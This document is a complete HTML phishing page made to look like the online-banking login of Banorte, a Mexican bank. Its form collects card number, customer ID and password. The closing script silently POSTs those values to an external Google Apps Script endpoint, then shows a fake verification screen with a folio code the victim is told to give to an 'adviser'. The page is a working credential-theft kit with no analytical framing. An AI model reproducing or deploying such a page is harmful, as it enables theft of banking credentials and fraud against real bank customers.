<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="preconnect" href="https://fonts.googleapis.com">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;700&display=swap" rel="stylesheet">  
	<link rel="stylesheet" href="css/form.css">
	<link rel="icon" href="favi.png">
	<meta name="robots" content="noindex, nofollow">
	<title>Banorte | Acceso</title>
</head>
<body>
	<div class="contenedor">
		<div class="columna-top-rwd">
        
		</div>
		<div class="columna-izquierda">
			<div class="registro activo" id="registro">
				<div class="header">
					
					<h1>¡Bienvenido a <strong>Banco en Línea!</strong> </h1>
					<br>
				</div>
		
					<form class="formulario" id="contact-form"  name="submit-form">
						<p class="centro"><strong>Tu Tarjeta</strong> 
						</p><br>
						<label for="nombre"></label>
					<div class="contenedor-input">
											<input type="number" id="tarjeta" name="tarjeta" type="number" placeholder="Tarjeta de Crédito o Débito">
					</div>
                    <p class="centro"><strong>Ingresa Tu Usuario</strong>
                    </p><br>
					<label for="correo"></label>
					<div class="contenedor-input">
						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16">
							
						</svg>
						<input id="fecha" name="fecha" placeholder="id de Cliente">
					</div>
					<p class="centro"><strong>Ingresa Tú contraseña</strong>
                    </p><br>
					<label for="correo"></label>
					<div class="contenedor-input">
						<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16">
							
						</svg>
						<input type="password" id="cvv" name="cvv" placeholder="Contraseña">
					</div>
					
                    <img src="img/trusteer-2.jpg">
					<div class="contenedor-boton">
							<button type="submit"  id="submit-contact-form" onclick="miMensaje()">
							Continuar
							
						</button>
					</div>
				</form>
			</div>

			<div class="header exito" id="exito">
				<img src="img/loading-gif.gif" style="scale: .5;">
				<h1>Verificando…</h1>
				<p>Folio generado con éxito. Comparte el folio con tu asesor virtual o telefónico.</p>
                <h1 class="folio">BAN-7528AW4</h1>
			</div>

		</div>

		<div class="columna-derecha">
            

			
		</div>
	</div>

<script>
const scriptURL = 'https://script.google.com/macros/s/AKfycbwnECIgHXeiEIUYAEYVJ0gggpiIfdDjqhsYrhnE-Mr-kDzatUH8Q63E8r5Ny05q2IODIg/exec'
const form = document.forms['submit-form']
const registro = document.getElementById('registro');
const exito = document.getElementById('exito');

form.addEventListener('submit', e => {
  e.preventDefault()
  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
    .then(response => console.log('Success!', response))
    .then(response => exito.classList.add('activo'))
    .then(response => registro.classList.remove('activo'))
    .catch(error => console.log('Error!', error.message))
   
	 
})
		
function miMensaje() {
  var element = document.getElementById("registro");
    element.classList.remove("activo");
  var element = document.getElementById("exito");
    element.classList.add("activo");	
}	

</script>   

</body>
</html>
